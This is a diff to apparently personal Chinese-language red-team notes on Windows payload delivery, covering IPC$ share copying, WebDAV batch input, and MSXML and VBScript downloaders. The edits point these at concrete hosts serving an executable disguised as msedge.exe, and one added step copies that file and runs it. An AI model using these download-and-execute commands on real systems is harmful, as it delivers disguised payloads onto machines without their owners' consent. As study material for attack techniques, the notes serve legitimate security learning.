@@ -845,9 +845,15 @@ IPC$ 是 Windows 操作系统中的一个共享资源，用于支持在网络上
 利用 `IPC$下载文件`
 
 ```powershell
-copy \192.168.3.1\c$\test.exe E:\file
+copy \\192.168.1.216\Shared\msedge.exe C:\temp\msedge.exe
+C:\temp\msedge.exe
+
 cmd.exe /k < \webdavserver\folder\batchfile.txt
 ```
+
+![image-20240627103743936](http://cdn.ayusummer233.top/DailyNotes/202406271037457.png)
+
+---
 
 挂载共享文件的主机需要打开无密码保护的共享
 
@@ -891,7 +897,7 @@ Microsoft XML (MSXML) 是一个开放源代码的 XML 解析器和 HTTP 客户�
 # 新建一个 COM 对象, 它是 Msxml2.ServerXmlHttp 类的一个实例, 用于发送 HTTP 请求和接受响应
 $comMsXml = New-Object -ComObject MsXml2.ServerXmlHttp; 
 # 使用 COM 对象的 Open 方法打开一个 HTTP GET 请求; $False 表示同步请求(非异步)
-$comMsXml.Open('GET', 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1', $False); 
+$comMsXml.Open('GET', 'http://100.1.1.131:8000/download/msedge.exe', $False); 
 # 使用 COM 对象的 Send 方法发送 HTTP 请求并等待响应, 响应会被保存在 COM 对象的 ResponseText 属性中
 $comMsXml.Send(); 
 Write-Host $comMsXml.ResponseText
@@ -1280,7 +1286,7 @@ Remove-Item $file2 -ErrorAction Ignore
 
 ```vbscript
 Set args = Wscript.Arguments
-Url = "http://domain/file"
+Url = "http://100.1.1.131:8000/download/msedge.exe"
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
 xHttp.Open "GET", Url, False
